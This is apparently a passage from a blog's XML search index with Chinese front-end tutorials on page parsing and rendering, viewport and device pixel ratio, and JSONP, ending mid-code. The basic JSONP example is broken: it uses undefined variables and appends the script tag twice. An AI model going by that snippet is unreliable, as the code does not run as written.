解析渲染的过程</h1><p>浏览器在下载页面资源的同时，开始对页面进行解析与渲染，这是两个分离的过程。解析是生成 DOM 结构，JS 可以操作已被解析的 DOM；而渲染是将 DOM 与 CSSOM 相结合生成渲染数显示到界面的过程，渲染了之后用户才可以在屏幕上看到图像。</p><p>在解析渲染的过程中，我们要明晰三点：</p><ul><li>JS 加载会阻塞页面的解析与渲染</li><li>CSS 加载不会阻塞页面解析，但是会阻塞页面渲染</li><li>CSS 会阻塞 JS 的执行</li></ul><p>首先 JS 会阻塞页面的解析与渲染，实际上 JS 阻塞的是 DOM 的解析过程，既然无法完成解析，就无法进行渲染了。</p><p>DOM 解析到 JS 标签处，如果没有下载完，先渲染出前面的部分，等待 JS 的下载与执行；</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191129215321.png" alt="20191129215321.png"></p><p>DOM 解析到 JS 标签出，如果下载完了，等待 JS 执行完毕后再渲染页面。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20191129215127.png" alt="20191129215127.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从移动端适配探讨响应式布局与 view-port</title>
      <link href="/2019/11/2e8490eaa0e2.html"/>
      <url>/2019/11/2e8490eaa0e2.html</url>
      
        <content type="html"><![CDATA[<h1 id="viewport影响着我们页面的什么？"><a href="#viewport影响着我们页面的什么？" class="headerlink" title="viewport影响着我们页面的什么？"></a>viewport影响着我们页面的什么？</h1><p>viewport是虚拟显示视口，它是时刻存在的（在现代浏览器上），我们设置meta标签只是去改变viewport的相关属性，并非是去设置一个viewport。只是在响应式页面开发过程中，默认的viewport会造成我们页面观感不合适，所以要去设置默认的缩放比例，以及viewport默认宽度，来适应响应式的开发。</p><blockquote><p>窄屏幕设备（如移动设备）在一个虚拟窗口或视口中渲染页面，这个窗口或视口通常比屏幕宽；然后缩小渲染的结果，以便在一屏内显示所有内容。然后用户可以移动、缩放以查看页面的不同区域。例如，如果移动屏幕的宽度为640px，则可能会用980px的虚拟视口渲染页面，然后缩小页面以适应640px的窗口大小。</p></blockquote><p>当一个页面将要展示到我们的手机上时，页面会先在viewport中渲染，假如说我们没有设定viewport的宽度，页面会按照默认的980px的宽度去渲染（想象一下把你的浏览器窗口缩小为980px的宽度，你所看到的效果就是viewport中的渲染效果），然后渲染好的页面会被缩放显示到我们的设备上（想象一下把你缩小为宽度为980px的浏览器上的画面，塞到你的手机中）。</p><blockquote><p>PS：在 Chrome 上以移动端显示效果进行调试会存在 BUG，当我们在设置了 mata 标签时取消 mata 标签，此时的 viewport 宽度仍为设备宽度而并非 980px 此时刷新页面视口的显示效果也不会改变，这时需要我们手动切回桌面端的显示效果，然后再切换为移动端。</p></blockquote><p>我们来看一组示例（默认viewport）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.topbar</span> &#123;<span class="attribute">width</span>: <span class="number">100%</span>;<span class="attribute">height</span>: <span class="number">200px</span>;<span class="attribute">background-color</span>: pink;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.container</span>&#123;<span class="attribute">width</span>: <span class="number">300px</span>;<span class="attribute">height</span>: <span class="number">300px</span>;<span class="attribute">background-color</span>: skyblue;<span class="attribute">margin</span>: <span class="number">0</span> auto;&#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;topbar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/29/eahqXZrIJ7PARLD.png" alt="20191129000538.png"></p><p>看起来布局上似乎很完美，但当我们添加上文字后，在我们的手机上就会这样显示：</p><center><p><img src="https://i.loli.net/2019/11/29/JIWFeYHq7lbtGT4.png" alt="20191129000558.png"></p></center><p>文字内容简直小的可怜，这就是为什么我们不愿意去使用默认的viewport：他会无视我们手中实际设备的宽度去按照960px的宽度渲染页面，然后将渲染好的页面进行<strong>缩放</strong>再塞入我们的手机显示器，导致页面被缩放的过小。假入我们此时规定viewport的宽度与设备宽度相等，如下加入meta标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于iPhoneSE来说，它的宽度为320px，那么viewport就以320px的宽度去渲染页面而非980px，之后渲染好的页面就不会被缩放，而是直接显示在我们的手机上，如下效果：</p><center><p><img src="https://i.loli.net/2019/11/29/2RYJ9UuzrbNwxvB.png" alt="20191129000619.png"></p></center><p>当然，我们也能看出，我们再下方定义的固定宽高的div，也同样会被缩放，这就是为什么我们推荐在响应式开发中使用半分比宽度而非绝对宽度，这会导致元素的缩放不合理，当有元素超过我们的viewport宽度后，viewport机制就会错乱，分为以下两种情况（针对Chrome和最新的Android Webview）：</p><ul><li>如果我们设置了viewport，此时固定元素宽度如果大于设置的viewport宽度，viewport的宽度会回变化为页面最宽的元素，来显示过宽的元素，但是如果宽度设置为100%的元素，宽度仍保持原有的viewport宽度。</li></ul><center><p><img src="https://i.loli.net/2019/11/29/yLdfOrjIaYgTUPS.png" alt="20191129000644.png"></p></center><ul><li>当最宽的元素宽度大于980px（或者我们设置的最大viewport宽度），就会出现横向滚动条来显示我们页面中最宽的元素。</li></ul><h1 id="什么像素比和物理像素？"><a href="#什么像素比和物理像素？" class="headerlink" title="什么像素比和物理像素？"></a>什么像素比和物理像素？</h1><blockquote><p>像素比(dpr) = 物理像素 / css像素</p></blockquote><p>通过 <code>window.devicePixelRatio</code> 获得当前设备的DPR</p><p>如：iPhoneX的DPR为3，iPhone5 Se的DPR为2，正常显示器的DPR为1</p><p>拿iPhoneSE来说，我们都知道iPhoneSE的分辨率为<code>640 x 1136</code>，而如果我们使用chrome调试工具将页面切换为移动端设备视图，我们会发现chrome显示的设备分辨率为<code>320 x 568</code>。</p><p><img src="https://i.loli.net/2019/11/29/VpGwbtCBrRPofvh.png" alt="调试工具界面"></p><p>这是因为我们在手机上定义像素如果还按照大屏显示器那样去规定像素的话，文字、识图都会看起来小到无法识别（想象一下你将显示器缩小为如同手机那样的大小你还能看清屏幕上的文字吗），所以我们规定了一个<strong>缩放比</strong>来优化显示效果。</p><p>iPhoneSE的缩放比为2，那么我们将它的物理像素统统除以2，得到的结果便是 <code>320 x 568</code> ，即一个实际像素显示2个物理像素。</p><p><img src="https://i.loli.net/2019/11/29/MXw2gQdxiyEDzRG.png" alt="1px指的是CSS像素"></p><h1 id="计算页面元素真实的物理像素"><a href="#计算页面元素真实的物理像素" class="headerlink" title="计算页面元素真实的物理像素"></a>计算页面元素真实的物理像素</h1><p>那假如我们再页面上定义了一个200px宽高的div，那么它在iPhoneSE上显示的实际大小为多少呢。</p><ol><li>如果我们不定义viewport，viewport在所有的显示设备上的显示宽度均为980px。那么在iPhoneSE上，我们看到的定义的200px宽高的元素的实际物理像素宽高为 <code>640*(200/980)px</code>。</li></ol><p><img src="https://i.loli.net/2019/11/29/9VYo8kqErlIODGi.png" alt="viewport默认宽度"></p><ol><li>如果我们定义了viewport的宽度为设备宽度，那么在iPhoneSE上，我们看到的定义为200px宽高的元素的实际物理像素宽高为 <code>640*(200/320)px</code>，即为 <code>CSS像素*DPR</code>。 </li></ol><p><img src="https://i.loli.net/2019/11/29/PNs15RwKvu2Lagq.png" alt="定义viewport宽度为设备宽度"></p><h1 id="何为缩放比"><a href="#何为缩放比" class="headerlink" title="何为缩放比"></a>何为缩放比</h1><p>缩放比即为我们再meta标签中设置的 <code>initial-scale</code>。它指的是当我们用移动设备去查看页面时，页面会被放大的倍数，只在我们设定viewport宽度后生效。</p><p>比如，当我们定义，如下meta标签，显示在ipad等移动设备上页面会被放大两倍：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/29/lLQaEDKgTxIYUJH.png" alt="桌面显示器显示效果"></p><p><img src="https://i.loli.net/2019/11/29/WpvkZqBbh4sORUN.png" alt="ipad显示效果"></p><p>那缩放比具体有什么卵用呢？</p><p>当我们浏览一个移动端页面，针对页面上的一个按钮，如果不设置缩放，iPhoneSE和iPhone6 Plus会按照同样的按钮大小去展示。但这样的话iPhone6 Plus由于屏幕更大，显示按钮就会显得过小，观感上很不协调，所以我们这时候就可以将其缩放比设置为 <code>414/320</code> 即为 <code>1.29</code> ，即代表这个按钮在iPhone6 Plus上会按照1.29倍等比例放大，这样整个页面的观感就会更好。</p><p>当然如果我们采用 <code>rem</code> 机制去动态改变元素的宽高和字体大小，也能达到同样的效果。</p><h1 id="1px物理像素的实现"><a href="#1px物理像素的实现" class="headerlink" title="1px物理像素的实现"></a>1px物理像素的实现</h1><p>思路：</p><p>这道题的应用场景在于，当我们拿到设计师的图纸时，图纸上的单位往往是像素级单位，但是由于存在像素比，所以当我们将一个元素按照设计图纸上的像素单位去填写时，会导致元素被缩放，我们需要考虑如何使其不缩放。</p><p>这道题的目的在于，让显示器设备和移动设备都享有同样的CSS像素，即有相同的物理像素，让手机端按1个真实的物理像素点去显示页面上的1px。我们可以通过获取设备的像素比，加上利用meta标签的缩放设置，将页面缩放设置为 <code>1/像素比</code>。</p><p><strong>方案一：使用缩放比，将整体页面缩放为1/dpr</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>1px物理像素的实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    * &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">320px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">568px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 获取像素比 </span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> dpr = <span class="variable language_">window</span>.<span class="property">devicePixelRatio</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 缩放比例</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> scale = <span class="number">1</span> / dpr;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> width = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 获取meta标签</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> metaNode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;meta[name=&#x27;viewport&#x27;]&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      metaNode.<span class="title function_">setAttribute</span>(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;width=device-width, initial-scale=&#x27;</span> + scale)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>方案二：使用transform和媒体查询器对单个元素进行缩放</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>1px物理像素的实现<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#line-1</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#line-2</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#line-2</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">-webkit-min-device-pixel-ratio</span>: <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#line-2</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.3333</span>);</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  高度为10px(实际像素)：</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;line-1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  高度为10px(物理像素)：</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;line-2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重拾JSONP，手动封装JSONP的多种写法</title>
      <link href="/2019/11/51e765ec4f55.html"/>
      <url>/2019/11/51e765ec4f55.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-JSONP-原理以及传统的实现方案"><a href="#1-JSONP-原理以及传统的实现方案" class="headerlink" title="1. JSONP 原理以及传统的实现方案"></a>1. JSONP 原理以及传统的实现方案</h1><p>在如今的前后端分离传递数据的方式下，大多解决跨域的方案都使用设置 CORS（跨域资源共享），但是 jsonp 由于可以兼容低版本浏览器，现在仍然还有在使用，同时其实现思路也比较有意思，所以在此记录一下。</p><p>jsonp 的实际原理就是客户端通过 <code>script</code> 标签的 <code>src</code> 属性向服务器发送一个 get 请求，服务器端返回一个格式为 <code>Content-Type: text/javascript; charset=utf-8</code> 的响应数据。换句话说就是从服务器引入一个脚本文件，由于 <code>script</code> 标签不受同源策略的影响，因此可以按照这种方式来进行跨域的数据传输。</p><p>服务器返回的数据通常为一个引用函数，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">callback</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;huahua&quot;</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;)</span><br></pre></td></tr></table></figure><p>我们以 Express 框架为例，设置一个 jsonp 请求服务器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serve.js </span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/jsonp&quot;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">jsonp</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;huahua&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">19</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`serve on http://localhost:3000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当浏览器访问 <code>http://localhost:3000/jsonp?callback=test</code> ，就会获取如下数据：</p><p><img src="https://i.loli.net/2019/11/27/bgpV9FqtOLThiek.png" alt="20191127223441.png"></p><p>所以基本流程就是：</p><ol><li>客户端编写一个回调函数</li><li>向 <code>&lt;head&gt;&lt;/head&gt;</code> 标签中加入一个 <code>script</code> 标签，标签的 url 为请求 jsonp 数据的地址</li><li>引入的 <code>script</code> 脚本执行回调函数</li></ol><p>因此我们可以编写一个最原始的请求方案：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ...... --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.data&quot;</span>).<span class="property">innerHTML</span> += <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getdata</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 添加 script 标签</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;options.url&#125;</span>?callback=<span class="subst">$&#123;options.cbName&#125;</span><span class="subst">$&#123;queryString&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 移除 script 标签</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;getdata()&quot;</span>&gt;</span>get data<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;data&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://i.loli.net/2019/11/27/Ox4QEmaMXhNYq3J.png" alt="等待点击按钮"></p><p><img src="https://i.loli.net/2019/11/27/sRIo63wegvtPZ1C.png" alt="点击按钮获取数据"></p><h1 id="2-封装方案"><a href="#2-封装方案" class="headerlink" title="2. 封装方案"></a>2. 封装方案</h1><h2 id="2-1-JsonpRequest-对象"><a href="#2-1-JsonpRequest-对象" class="headerlink" title="2.1 JsonpRequest 对象"></a>2.1 JsonpRequest 对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">JsonpRequest</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">url, cb, query, cbName = <span class="string">&quot;callback&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">url</span> = url</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cb</span> = cb</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cbName</span> = cbName</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">query</span> = query</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">queryString</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span 